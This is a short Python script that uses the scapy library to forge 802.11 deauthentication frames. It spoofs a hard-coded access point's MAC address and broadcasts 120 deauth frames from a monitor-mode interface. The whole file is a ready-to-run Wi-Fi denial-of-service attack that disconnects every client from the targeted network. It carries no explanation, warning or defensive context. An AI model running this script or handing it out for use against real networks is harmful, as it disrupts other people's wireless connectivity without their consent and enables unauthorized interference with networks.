#!/usr/bin/python3
from scapy.all import *

iface ="wlan1mon"
target = "08:60:6e:79:4e:a8"

dst = "ff:ff:ff:ff:ff:ff"
src = target
bssid = target
deauth = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=bssid) / Dot11Deauth()
sendp(deauth, iface=iface, count=120, inter=.2, verbose=True)
